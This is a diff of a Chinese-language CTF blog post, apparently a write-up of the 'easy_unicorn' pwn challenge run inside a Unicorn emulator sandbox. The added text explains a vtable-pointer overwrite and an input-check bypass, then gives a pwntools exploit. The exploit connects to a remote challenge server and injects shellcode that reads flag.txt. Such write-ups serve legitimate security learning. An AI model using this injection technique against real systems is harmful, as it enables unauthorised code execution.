@@ -4,7 +4,7 @@ date: 2020-03-09 11:26:49
 tags: PWN
 ---
 
-这两天打了这个,做了几道pwn和逆向
+这两天打了这个,做了几道pwn
 
 # EasyVM
 
@@ -255,4 +255,55 @@ int main()
 
 # easy_unicorn
 
-用unicorn跑了一个程序,要我们pwn这个文件,总体实现还是可以理解的,但是卡在了恢复文件的过程中
+用unicorn跑了一个程序,要我们pwn这个文件,总体实现还是可以理解的,但是卡在了恢复文件的过程中,赛后复现的时候,发现其实并没有想的那么难,题目提供了一个dump文件,文件中记录着一个程序在运行时所有的段,然后利用unicorn把他加再进去.
+
+题目逻辑就是先将passwd加密,然后打印在屏幕上,需要进行逆向
+
+然后输入程序,发现后面没有输入点了,这时继续分析主函数,发现一个函数指针的调用,这里是在一个结构体里面的vtable指针,结构体指针在栈里
+
+```
+p
+*p = vtable
+call *(*p + 8)
+```
+
+在函数前部,可以看到一个给vtable赋值的地方,分别是赋值0x401920然后用0x401900盖住,看到相应的位置,可以看到,其实这里是两组vtable,然后只有后面那组才有输入功能,这里需要改vtable的值,最后看到在输入失败的时候1,会有一个*a++的操作,也就是指针加,但是输入失败的时候,在while循环中,会检查输入的字节,累计字节不能超过4,所以只能发送空内容,这样就能绕过这个检测
+
+不知道为什么本地打不起来...,open文件总是出问题
+
+实现原理就是给syscall添加hook,在每次调用到syscall时,由sandbox处理,例如open,则sandbox会从寄存器读出寄存器以及字符串值,然后代替打开文件,返回文件描述符,继续运行
+
+
+
+exp:
+
+```
+from pwn import *
+
+context.arch = "amd64"
+
+r = remote("121.37.167.199",9998)
+#r = process("./x86_sandbox")
+key = "062f392d417574680083100500080000"
+
+for i in range(0x20):
+    r.sendlineafter(" << ","")
+
+r.sendlineafter(" << ",key)
+#r.sendlineafter("]","n")
+r.recvuntil("data ptr:")
+p = int(r.recvline(),16)
+print hex(p)
+
+shellcode = shellcraft.open("flag.txt")
+shellcode += shellcraft.read(3,0x603080,0x20)
+shellcode += shellcraft.write(1,0x603080,0x20)
+
+r.sendlineafter("<<",asm(shellcode))
+r.sendlineafter("<<",str(p))
+r.sendlineafter("<<",str(p))
+r.sendlineafter("<<",str(p))
+r.sendlineafter("<<",str(p))
+r.interactive()
+```
+
